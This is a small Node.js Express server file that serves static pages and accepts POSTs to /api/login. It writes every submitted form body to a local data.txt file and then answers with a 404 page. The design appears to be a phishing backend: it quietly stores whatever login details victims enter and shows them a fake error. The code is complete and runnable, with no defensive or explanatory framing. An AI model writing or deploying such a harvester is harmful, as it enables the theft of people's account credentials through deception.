const express = require('express');
const bodyParser = require('body-parser');
const path = require('path')
const fs = require('fs')

const dataFilePath = './data.txt';

function server(port) {
  const app = express();
  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: true }))

  app.use(express.static(path.resolve(__dirname, 'html')));
  app.get('/api/login', (req, res) => {
    res.status(200).sendFile(path.resolve(__dirname, 'html/404.html'))
  })
  app.post('/api/login', (req, res) => {
    console.log(req.body)
    const data = JSON.stringify(req.body)

    fs.appendFile(dataFilePath, data + "\n", { flag: 'a+'},  function (err) {
      if (err) throw err;
      console.log('The "'+ data +'" was appended to file')
    });

    res.status(200).sendFile(path.resolve(__dirname, 'html/404.html'))
  });

  app.listen(port, () => {
    console.log(`Server is running on port: ${port}`);
  });
}

server(3000)
